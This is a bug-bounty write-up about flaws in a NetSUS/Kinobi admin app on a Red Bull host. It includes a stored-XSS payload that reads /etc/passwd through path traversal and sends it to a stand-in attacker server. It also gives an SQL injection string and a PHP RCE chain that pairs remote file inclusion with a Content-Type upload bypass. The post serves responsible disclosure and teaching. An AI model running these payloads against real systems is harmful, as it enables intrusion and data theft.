---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-12-26_how-i-found-multiple-critical-bugs-in-red-bull.md
original_filename: 2022-12-26_how-i-found-multiple-critical-bugs-in-red-bull.md
title: How I found multiple critical bugs in Red Bull
category: documents
detected_topics:
- sqli
- command-injection
- path-traversal
- idor
- xss
- file-upload
tags:
- imported
- documents
- sqli
- command-injection
- path-traversal
- idor
- xss
- file-upload
language: en
raw_sha256: 1c91d9d0267d1361387d07482d825d41678d7f8dea565f206f0c7850527801ce
text_sha256: 650835a043cfe6aed46cd68d845e2bac67c99d09283c9edc852e3cdd8056b5d9
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: false
---

# How I found multiple critical bugs in Red Bull

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-12-26_how-i-found-multiple-critical-bugs-in-red-bull.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, path-traversal, idor, xss, file-upload
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: False
- Raw SHA256: `1c91d9d0267d1361387d07482d825d41678d7f8dea565f206f0c7850527801ce`
- Text SHA256: `650835a043cfe6aed46cd68d845e2bac67c99d09283c9edc852e3cdd8056b5d9`


## Content

---
title: "How I found multiple critical bugs in Red Bull"
page_title: "How I found multiple critical bugs in Red Bull - Bergee's Stories on Bug Hunting"
url: "https://bergee.it/blog/how-i-found-multiple-critical-bugs-in-red-bull/"
final_url: "https://bergee.it/blog/how-i-found-multiple-critical-bugs-in-red-bull/"
authors: ["Bartłomiej Bergier (@_bergee_)"]
programs: ["Red Bull"]
bugs: ["Authentication bypass", "HTTP response manipulation", "Path traversal", "LFI", "XSS", "SQL injection", "RCE", "Unrestricted file upload", "RFI", "Security code review"]
publication_date: "2022-12-26"
added_date: "2022-12-30"
source: "pentester.land/writeups.json"
original_index: 1732
---

# How I found multiple critical bugs in Red Bull

Posted on [2022-12-262026-04-27](https://bergee.it/blog/how-i-found-multiple-critical-bugs-in-red-bull/) by [bergee](https://bergee.it/blog/author/bergee/)

## Auth misconfiguration

One afternoon I decided to try my luck on the Red Bull VDP program. I gathered the subdomains and looked at interesting ones in the browser. I opened one of them let’s call it subdomain.redbull.com and I saw some web interface. Which looks like this:

![](https://bergee.it/blog/wp-content/uploads/2022/12/netsus_webinterface.png)

I tried Local login and some default credentials like admin/admin, and admin/test but nothing worked. I examined the headers and noticed PHPSESSID inside. I decided to do directories and file enumeration with ffuf. And found some endpoints but all of them redirected me to the main web interface site. I thought nothing to look for here. Later that day I decided to do some enumeration again with another wordlist. Also found some endpoints which redirected me to the main interface. But what caught my attention this time was the response sizes. They differ from endpoint to endpoint. If the point of the redirection was the same they all should be equal in size. I examined some of them with the curl and saw different responses. I figured out that must be some misconfiguration where the redirection occurs AFTER the actual script is executed and the site is rendered. I immediately turn on Burp proxy and add some rules to stop redirecting in a way I could see the pages in the browser. This can be done via Proxy->Options->Match and Replace.

![](https://bergee.it/blog/wp-content/uploads/2022/12/stop_redirection_burp-1.jpg)

After applying these rules I refreshed the page and… I was inside the app. I haven’t tried anything there. Just reported it immediately. The severity was marked as medium and I was rewarded with one tray of RedBull :). After some time they fixed the bug. Whenever I entered the app URL, there was no login screen and I was redirected to some other auth site. Seemed secured.

## Not so good fix

After several months I decided to dig into RedBull VDP again. Somehow I checked again the same URL. I ran ffuf again just to see that although there is no login screen the PHP endpoints such as dashboard.php are still there. Again I set the same redirect-stopping rule in burp, entered the https://subdomain.redbull.com/webadmin/dashboard.php endpoint, and again was inside the app. Hooray. This time I decided to dig deeper into the app. Pretty fast I figured out it is NetSUS app by jamf. So started to look for exploits for it. I found nothing. So I moved to github and bingo… The app is open source so I had all the source code available here:

<https://github.com/jamf/NetSUS/>

The real fun has just started. I decided to dig into the code myself hoping to find some bugs. The app was running also the extension called Kinobi patch server available here:

<https://github.com/mondada/kinobi/>

I found some interesting bugs within these two apps.

## Path traversal and LFI

I found the functionality which allows you to download the patches. Here is the URL:

[https://subdomain.redbull.com/webadmin/webadmin/patchCtl.php?download=somepatchfile](https://jamfdp.redbullmediahouse.com/webadmin/webadmin/patchCtl.php?download=../../../../../../../../../etc/passwd)

What if I change the somepatchfile to ../../../../../../etc/passwd? It worked, This endpoint suffered from path traversal and allowed me to read files from server such as /etc/passwd. But there was a catch here. The way I was logged in to the app, by redirect stopping in Burp I was not fully authenticated. I could do a lot of actions that only checked the session cookie in the browser. However some functionalities also properly checked for server-side sessions and I could not make use of them. This downloading action was one of them. What now I snooped around the app and very quickly found an XSS vulnerability (in fact there were many on them). In this domain, the XSSes were out of scope, unfortunately :(.

With the help of XSS, I figured out the possible attack scenario:

  1. The attacker login into the web app (using redirect misconfiguration)
  2. The attacker goes to Patch Definitions -> Software Titles -> External Attributes, and save a new attribute entry but replaces the name of it with a crafted payload.
  3. The legitimate admin / user / employee login into the web app after some time, enters this part of the portal then the XSS is fired (as it is stored one), sending the /etc/passwd file directly to the attacker server.

The payload I used was:

> %3Cimg%20id%3D%27imgx%27%3E%3Cimg%20src%3Dx%20onerror%3D%27var%20done%3D0%3Bif%28%21done%29%7Bvar%20xmlhttp%3Dnew%20XMLHttpRequest%3Bxmlhttp.onreadystatechange%3Dfunction%28%29%7Bif%284%3D%3Dxmlhttp.readyState%26%26200%3D%3Dxmlhttp.status%26%260%3D%3Ddone%29%7Bdone%3D1%2CstolenPage%3DencodeURI%28btoa%28xmlhttp.responseText29%292Cdocument.querySelector28%2223imgx22%29.src3D%22https3A%2F2Fattackerserver8%2Fexfil3F%222BstolenPage7D%7D2Cxmlhttp.open28%22GET22%2C22%2Fwebadmin%2FpatchCtl.php%3Fdownload%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%22%2C%210%29%2Cxmlhttp.send%28null%29%7D%27%3E

which is a urlencoded and minified version of:

> 
>  <img id='imgx'><img src=x onerror='
>  var done=false;
>  if (!done) {
>  var xmlhttp = new XMLHttpRequest();
>  xmlhttp.onreadystatechange = function() {
>  if (xmlhttp.readyState==4 && xmlhttp.status==200 && done==false) {
>  done=true;
>  stolenPage = encodeURI(btoa(xmlhttp.responseText));
>  const img = document.querySelector("#imgx");
>  img.src = "https://attackerserver/exfil?"+stolenPage;
>  }
>  }
>  }
>  xmlhttp.open("GET", '/webadmin/patchCtl.php?download=../../../../../../../../../etc/passwd', true);
>  xmlhttp.send(null);}'>
>  

This code retrieves /etc/passwd using path traversal in patchCtl.php file via XML HTTP request encodes the response in BASE64 and sends the response as the GET parameter of the attacker site via IMG SRC tag. As the XSS fired twice there were some problems in between the requests, hence the “done” variable to avoid the second request. Dirty hack but worked.

![](https://bergee.it/blog/wp-content/uploads/2022/12/xss_lfi-1.jpg)

If you decode the base64 garbage above you can see it’s the content of /etc/passwd file.

And this vulnerability I found just by playing with the app, without even looking at the source code yet. The bug existed in Kinobi project in the patchCtl.php file here:

![](https://bergee.it/blog/wp-content/uploads/2022/12/lfi_vuln_code.jpg)

## SQL Injection

This vulnerability is located in /webadmin/patchTitles.php. The SQL creating the title is properly escaped. however, the SQL reading the added titles is not.

![](https://bergee.it/blog/wp-content/uploads/2022/12/sql_injection_code_1.jpg)

The code above looks fine, however:

![](https://bergee.it/blog/wp-content/uploads/2022/12/sql_injection_code_2.jpg)

this code does not look good the selected value is concatenated directly into the query. All I needed to do here was to build the proper SQL payload and put it into the **name_id** variable while creating the title. I used this one:

> a’ union SELECT group_concat(tbl_name) from sqlite_master–

that listed all tables from the database. The app was using SQLite database.

![](https://bergee.it/blog/wp-content/uploads/2022/12/sql_injection_result.jpg)

## The first RCE – RFI and upload restrictions bypass

There was a subscription feature in the app. This feature gets data from a JSON file sitting on a remote server without validation, so I could feed it with fake data. That was the request to set the subscription data:

That’s the POST request that set desired parameters:

![](https://bergee.it/blog/wp-content/uploads/2022/12/post_reqest_set_subscription_redacted.jpg)

The format of the fake_subscription.json subscription file was:

> {“token”:”12345678901234567890123456789011″,”import”:”/tmp/rce.php”,”expires”:”2099-12-31″}

The subs_url is the URL of the subscription JSON file on the attacker’s server, the subs_token must be present and must much the token field in the JSON file. There were three fields in the subscription JSON file:

  1. a token which I described above – could be 32 long character string
  2. import – the location of the PHP file that will be executed
  3. expires – some date was also required

Now I needed to upload the rce.php file to /tmp location. I did that by abusing the backup upload feature. Originally the upload path was set to /var/www/kinobi/backup but I changed it to /tmp by using the application interface. The upload feature allowed me to upload .sql.gz files but validated only the Content-Type which had to be application/x-gzip. I could upload any file (.php also) just by changing the Content-Type to application/x-gzip. This way I upload the rce.php file to /tmp. The path to this file was already set in the fake_subscription.json file. Here is the request for uploading the rce.php file:

![](https://bergee.it/blog/wp-content/uploads/2022/12/rce1_upload_post_redacted.png)

The rce.php file was filled with X to “defeat” some CSS alignment to make the output of the script visible. The system() php command was not blocked I could easily execute OS commands on the server. I executed id, whoami and hostname. The piece of code responsible for uploading backup files was:

![](https://bergee.it/blog/wp-content/uploads/2022/12/code_upload_backup.png)

As you can see nothing more than content-type checking. All I had to do now is to run my evil server serving the fake_subscription.json file and enter https://subdomain.redbull.com/webadmin/patchTitles.php URL to execute the rce.php. The code responsible for the final RCE was inside patchTitles.php:

![](https://bergee.it/blog/wp-content/uploads/2022/12/include_code.png)

No sanitization, filtering, or checking. The below screenshots show the final result.

![](https://bergee.it/blog/wp-content/uploads/2022/12/rce_output_under_software_titles_cut_redacted.jpg)

![](https://bergee.it/blog/wp-content/uploads/2022/12/get_subscription_redacted.png)

## The second RCE

For now, I was pretty happy with my findings. So the next day I was still digging. And I found another RCE. The root cause was identical to the first one and the exploitation method was the same, the difference was the same vulnerable code was located in the manageTitle.php file. So from the perspective of bug hunting that was another bug. This time I used:

> <?php for ($i=0; $i<=50; $i++) { system(“id”); }

as rce.php file. The proof:

![](https://bergee.it/blog/wp-content/uploads/2022/12/manage_title_rce_redacted.jpg)

I reported the findings and the application was taken down back then immediately.

## The end

My findings were marked as medium, critical, and in the end exceptional. I was very happy with that. I was rewarded with a huge amount of Red Bull cans and a high-quality pack of clothes, and sportswear. I learned not to trust redirections and examine them more carefully. In this case, I wouldn’t be able to find high-severity bugs without reading the source code.

Reward: Red Bull cans, exceptional gift

![](https://bergee.it/blog/wp-content/uploads/2022/12/FkpwD_wX0AMBnev-768x1024.jpg)
